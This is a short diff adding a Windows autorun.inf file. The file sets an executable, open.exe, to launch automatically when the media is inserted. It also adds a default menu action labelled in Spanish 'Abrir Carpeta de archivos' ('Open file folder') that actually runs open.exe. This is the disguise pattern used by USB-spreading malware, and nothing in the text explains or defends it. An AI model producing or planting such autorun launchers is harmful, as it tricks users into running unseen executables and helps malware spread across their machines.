@@ -1,0 +1,8 @@
+[Autorun]
+Open=open.exe
+UseAutoPlay=1
+Shellexecute=open.exe
+action=Abrir Carpeta de archivos
+shell\Abrir-Carpeta=&Abrir...
+shell\Abrir-carpeta\command=open.exe
+default=1
